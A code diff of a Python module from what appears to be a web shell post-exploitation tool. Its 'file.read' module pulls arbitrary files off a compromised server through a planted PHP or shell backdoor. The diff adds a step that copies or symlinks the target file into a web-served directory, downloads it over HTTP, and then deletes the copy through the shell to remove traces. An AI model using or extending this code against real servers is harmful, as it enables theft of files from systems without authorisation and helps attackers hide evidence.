@@ -4,6 +4,7 @@ Created on 24/ago/2011
 @author: norby
 '''
 from core.module import Module, ModuleException
+from core.http.request import Request
 
 classname = 'Read'
     
@@ -12,7 +13,7 @@ class Read(Module):
     :file.read <path>
     '''
     
-    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "fread()", "file()",  "copy()", "symlink()"], 
+    vectors_order = { 'shell.php' : [ "readfile()", "file_get_contents()", "fread()", "file()", "symlink()", "copy()"  ], 
                       'shell.sh'  : [ "cat" ]
                      }
     
@@ -36,12 +37,11 @@ class Read(Module):
         self.payload = None
         self.vector = None
         self.interpreter = None
-        self.writable_dir = None
+        self.transfer_dir = None
+        self.transfer_url_dir = None
         
         
     def __slack_probe(self, remote_path):
-        
-
         
         for interpreter in self.vectors:
             for vector in self.vectors_order[interpreter]:
@@ -54,12 +54,12 @@ class Read(Module):
                         
                     if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
                         
-                        if not self.writable_dir:
-                            doc_root = self.modhandler.load('system.info').run('document_root')
-                            writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
-                            self.writable_dir = writable_dir
+                        if not (self.transfer_dir and self.transfer_url_dir):
+                            
+                            self.transfer_url_dir = self.modhandler.load('find.webdir').url
+                            self.transfer_dir = self.modhandler.load('find.webdir').dir
                         
-                        payload = payload % (remote_path, writable_dir, writable_dir)
+                        payload = payload % (remote_path, self.transfer_dir, self.transfer_dir)
                     
                     response = self.modhandler.load(interpreter).run(payload)
                     
@@ -77,10 +77,20 @@ class Read(Module):
     def __process_response(self,response):
       
         if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
-            print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
+            url = self.transfer_url_dir + '/file.txt'
+            file_path = self.transfer_dir + '/file.txt'
+            
+            print "[file.read] Reading file via \'%s\' and removing" % url
+            
+            response = Request(url).read()
+            
+            if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % file_path) != '1':
+                print "[!] [find.read] Error cleaning support file %s" % (file_path)
+                
         else:
             print "[file.read] File read using method '%s'" % (self.vector)
-            return response
+        
+        return response
         
      
     def run(self, remote_path):
